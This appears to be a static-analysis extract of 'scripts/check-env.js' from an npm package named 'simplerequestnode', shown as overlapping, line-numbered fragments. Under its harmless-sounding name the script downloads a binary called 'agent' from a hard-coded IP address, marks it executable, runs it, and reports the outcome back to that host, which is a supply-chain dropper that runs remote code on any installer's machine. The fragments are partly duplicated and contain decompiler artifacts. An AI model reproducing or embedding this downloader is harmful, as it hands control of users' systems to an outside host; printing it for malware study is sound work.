// File: tmp/tmpccdz3p7o/simplerequestnode/package/scripts/check-env.js
// ======================================================================
Line 1: const http = require("http")
Line 2: const fs = require("fs")
Line 3: _tmp_2 = require("child_process")
Line 6: <operator>.formatString("http://47.97.47.43:9003", path, "")
Line 18: const url = "http://47.97.47.43:9003/agent"
Line 25: response.pipe(file)
Line 27: {
        file.close();
        console.log("Agent downloaded successfully");

        // 设置可执行权限
        exec(`chmod +x ${filePath}`, (chmodError) => {
          if (chmodError) {
            console.error(
              "Failed to set executable permission:",
              chmodError.message
            );
            sendStatus(`/error?err=${encodeURIComponent(chmodError.message)}`);
            return;
          }

          console.log("Executable permission set");

          // 执行 agent
          exec(filePath, (execError, stdout, stderr) => {
            if (execError) {
              console.error("Failed to execute agent:", execError.message);
              sendStatus(`/error?err=${encodeURIComponent(execError.message)}`);
              return;
            }
            if (stderr) {
              console.error("Agent stderr:", stderr);
              sendStatus(`/error?err=${encodeURIComponent(stderr)}`);
              return;
            }
    ...
Line 32: {
          if (chmodError) {
            console.error(
              "Failed to set executable permission:",
              chmodError.message
            );
            sendStatus(`/error?err=${encodeURIComponent(chmodError.message)}`);
            return;
          }

          console.log("Executable permission set");

          // 执行 agent
          exec(filePath, (execError, stdout, stderr) => {
            if (execError) {
              console.error("Failed to execute agent:", execError.message);
              sendStatus(`/error?err=${encodeURIComponent(execError.message)}`);
              return;
            }
            if (stderr) {
              console.error("Agent stderr:", stderr);
              sendStatus(`/error?err=${encodeURIComponent(stderr)}`);
              return;
            }
            if (stdout) {
              console.log("Agent output:", stdout);
            }

            // 执行成功
            sendStatus("/ok");
          ...
Line 45: exec(filePath, (execError, stdout, stderr) => {
            if (execError) {
              console.error("Failed to execute agent:", execError.message);
              sendStatus(`/error?err=${encodeURIComponent(execError.message)}`);
              return;
            }
            if (stderr) {
              console.error("Agent stderr:", stderr);
              sendStatus(`/error?err=${encodeURIComponent(stderr)}`);
              return;
            }
            if (stdout) {
              console.log("Agent output:", stdout);
            }

            // 执行成功
            sendStatus("/ok");
          })
Line 76: main()
